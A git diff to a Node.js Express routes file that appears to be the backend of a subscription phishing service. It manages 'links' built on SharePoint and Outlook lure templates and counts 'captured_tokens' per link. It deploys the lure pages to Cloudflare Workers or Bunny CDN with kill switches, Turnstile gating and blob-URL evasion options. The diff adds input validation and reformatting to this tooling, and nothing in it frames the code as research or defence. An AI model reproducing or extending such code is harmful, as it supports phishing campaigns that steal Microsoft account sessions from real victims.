@@ -4,6 +4,7 @@ const jwt = require('jsonwebtoken');
 const db = require('../database/connection');
 const config = require('../config/env');
 const { userAuth } = require('../middleware/auth');
+const { validateResult, commonValidators } = require('../middleware/validator');
 
 function getLinkPublicUrl(link, user) {
   if (!link) return null;
@@ -59,11 +60,11 @@ router.get('/', userAuth, async (req, res) => {
     const { status } = req.query;
     let query = 'SELECT l.*, (SELECT COUNT(*) FROM captured_tokens WHERE link_id = l.id AND deleted = 0) as token_count FROM links l WHERE l.user_id = ?';
     const params = [req.user.id];
-
+    
     if (status === 'active') {
       query += " AND l.status = 'active' AND l.kill_switched = 0";
     }
-
+    
     query += ' ORDER BY l.created_at DESC';
     const [links] = await db.query(query, params);
     const enriched = links.map(link => ({
@@ -94,7 +95,7 @@ router.get('/:id', userAuth, async (req, res) => {
 // -------------------------------------------
 // Create link (with Cloudflare check, Bunny ready)
 // -------------------------------------------
-router.post('/', userAuth, async (req, res) => {
+router.post('/', userAuth, commonValidators.createLink, validateResult, async (req, res) => {
   try {
     if (req.user.subscription_status !== 'active') {
       return res.status(403).json({ error: 'Subscription not active' });
@@ -107,8 +108,7 @@ router.post('/', userAuth, async (req, res) => {
       name, worker_name, template_type, verification_design, auth_mode,
       destination_url, custom_domain, url_type, domain_connection, route_name,
       file_name, pages, title_text, message_text, button_text,
-      background_blur, blob_url_enabled, copy_to_open, turnstile_enabled,
-      custom_bg_url,
+      background_blur, blob_url_enabled, copy_to_open, turnstile_enabled, custom_bg_url,
     } = req.body;
 
     // If deploying to Cloudflare Worker, user must have credentials
@@ -139,21 +139,21 @@ router.post('/', userAuth, async (req, res) => {
     } else if (template_type) {
       generatedName = `${template_type.charAt(0).toUpperCase() + template_type.slice(1).replace(/[0-9]/g, '')} Link`;
     }
-    
+
     const [result] = await db.query(
       `INSERT INTO links
-       (user_id, name, worker_name, template_type, verification_design, auth_mode,
-        destination_url, custom_domain, url_type, domain_connection, route_name,
-        file_name, pages, title_text, message_text, button_text,
-        background_blur, blob_url_enabled, copy_to_open, turnstile_enabled, custom_bg_url)
-       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+      (user_id, name, worker_name, template_type, verification_design, auth_mode,
+      destination_url, custom_domain, url_type, domain_connection, route_name,
+      file_name, pages, title_text, message_text, button_text,
+      background_blur, blob_url_enabled, copy_to_open, turnstile_enabled, custom_bg_url)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
       [
         req.user.id, name || generatedName, uniqueWorkerName, template_type || 'sharepoint3',
         verification_design || 'outlook', auth_mode || 'token',
         destination_url || 'https://office.com', custom_domain || null,
         url_type || 'worker', domain_connection || 'subdomain', route_name || null,
-        file_name || null, pages || null, title_text || null, message_text || null,
-        button_text || null, background_blur || 4, blob_url_enabled ? 1 : 0,
+        file_name || null, pages || null, title_text || null, message_text || null, button_text || null,
+        background_blur || 4, blob_url_enabled ? 1 : 0,
         copy_to_open ? 1 : 0, turnstile_enabled !== false ? 1 : 0,
         custom_bg_url || null,
       ]
@@ -187,11 +187,11 @@ router.post('/', userAuth, async (req, res) => {
             routeName: route_name,
           }
         );
-        await db.query('UPDATE links SET worker_name = ?, url_type = ?, custom_domain = ?, custom_bg_url = ? WHERE id = ?', [deployment.workerName || worker_name, url_type, custom_domain || null, custom_bg_url || null, linkId]);
+        await db.query('UPDATE links SET worker_name = ?, url_type = ?, custom_domain = ?, custom_bg_url = ? WHERE id = ?',
+          [deployment.workerName || worker_name, url_type, custom_domain || null, custom_bg_url || null, linkId]);
       } catch (deployErr) {
         await db.query('UPDATE links SET status = ? WHERE id = ?', ['disabled', linkId]);
         console.error('[Links] Worker deployment failed:', deployErr.response?.data || deployErr.message);
-        // Safe error handling for various error formats
         let errorMessage = 'Worker deployment failed';
         if (deployErr.response?.data?.errors?.[0]?.message) {
           errorMessage += ': ' + deployErr.response.data.errors[0].message;
@@ -216,7 +216,7 @@ router.post('/', userAuth, async (req, res) => {
 // -------------------------------------------
 // Update link
 // -------------------------------------------
-router.put('/:id', userAuth, async (req, res) => {
+router.put('/:id', userAuth, commonValidators.updateLink, validateResult, async (req, res) => {
   try {
     const [existing] = await db.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!existing.length) return res.status(404).json({ error: 'Link not found' });
@@ -225,8 +225,7 @@ router.put('/:id', userAuth, async (req, res) => {
       'name', 'template_type', 'verification_design', 'auth_mode',
       'destination_url', 'custom_domain', 'url_type', 'domain_connection', 'route_name',
       'file_name', 'pages', 'title_text', 'message_text', 'button_text',
-      'background_blur', 'blob_url_enabled', 'copy_to_open', 'turnstile_enabled', 'status',
-      'custom_bg_url',
+      'background_blur', 'blob_url_enabled', 'copy_to_open', 'turnstile_enabled', 'status', 'custom_bg_url',
     ];
 
     const updates = {};
@@ -246,6 +245,7 @@ router.put('/:id', userAuth, async (req, res) => {
       }
       return `${k} = ?`;
     }).join(', ');
+    
     const values = Object.values(updates).map(v => {
       if (typeof v === 'boolean') return v ? 1 : 0;
       return v;
@@ -265,7 +265,7 @@ router.put('/:id', userAuth, async (req, res) => {
 // -------------------------------------------
 // Delete link (hard delete + cascade to Cloudflare worker)
 // -------------------------------------------
-router.delete('/:id', userAuth, async (req, res) => {
+router.delete('/:id', userAuth, commonValidators.deleteLink, validateResult, async (req, res) => {
   let connection;
   try {
     console.log(`[Links] Delete request for link ${req.params.id} by user ${req.user.id}`);
@@ -273,7 +273,7 @@ router.delete('/:id', userAuth, async (req, res) => {
     // Get a connection for transaction
     connection = await db.getConnection();
     await connection.beginTransaction();
-    
+
     const [existing] = await connection.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!existing.length) {
       console.log(`[Links] Link ${req.params.id} not found for user ${req.user.id}`);
@@ -288,19 +288,19 @@ router.delete('/:id', userAuth, async (req, res) => {
     // Delete associated visitors
     const [visitorsResult] = await connection.query('DELETE FROM visitors WHERE link_id = ?', [link.id]);
     console.log(`[Links] Deleted ${visitorsResult.affectedRows} visitors`);
-    
+
     // Delete associated tokens
     const [tokensResult] = await connection.query('DELETE FROM captured_tokens WHERE link_id = ?', [link.id]);
     console.log(`[Links] Deleted ${tokensResult.affectedRows} tokens`);
-    
+
     // Delete the link itself
     const [linkResult] = await connection.query('DELETE FROM links WHERE id = ?', [link.id]);
     console.log(`[Links] Deleted ${linkResult.affectedRows} link(s) from database`);
-    
+
     // Commit transaction
     await connection.commit();
     connection.release();
-    
+
     // Delete Cloudflare worker if it exists (fire-and-forget, don't block response)
     if (link.worker_name && req.user.cf_api_token && req.user.cf_account_id) {
       setImmediate(async () => {
@@ -316,9 +316,17 @@ router.delete('/:id', userAuth, async (req, res) => {
         }
       });
     }
-    
+
     console.log(`[Links] Successfully deleted link ${link.id}`);
-    res.json({ success: true, message: 'Link deleted successfully', deleted: { visitors: visitorsResult.affectedRows, tokens: tokensResult.affectedRows, links: linkResult.affectedRows } });
+    res.json({
+      success: true,
+      message: 'Link deleted successfully',
+      deleted: {
+        visitors: visitorsResult.affectedRows,
+        tokens: tokensResult.affectedRows,
+        links: linkResult.affectedRows
+      }
+    });
   } catch (err) {
     console.error('[Links] Delete error:', err);
     if (connection) {
@@ -421,7 +429,6 @@ router.post('/:id/deploy-bunny', userAuth, async (req, res) => {
   try {
     const [links] = await db.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!links.length) return res.status(404).json({ error: 'Link not found' });
-
     const link = links[0];
 
     if (!req.user.bunny_api_key || !req.user.bunny_storage_zone || !req.user.bunny_storage_region) {
@@ -430,7 +437,6 @@ router.post('/:id/deploy-bunny', userAuth, async (req, res) => {
 
     const templateLoader = require('../services/templateloader');
     const html = await templateLoader.generateExportHtml(link, req.user, {});
-
     const bunny = require('../services/bunny');
     const fileName = `vg-${link.worker_name || link.id}.html`;
     const result = await bunny.uploadToBunny(
@@ -442,9 +448,7 @@ router.post('/:id/deploy-bunny', userAuth, async (req, res) => {
       req.user.bunny_pull_url
     );
 
-    await db.query('UPDATE links SET custom_domain = ?, url_type = ? WHERE id = ?',
-      [result.url, 'bunny', link.id]);
-
+    await db.query('UPDATE links SET custom_domain = ?, url_type = ? WHERE id = ?', [result.url, 'bunny', link.id]);
     res.json({ url: result.url });
   } catch (err) {
     res.status(500).json({ error: err.message || 'Deployment failed' });
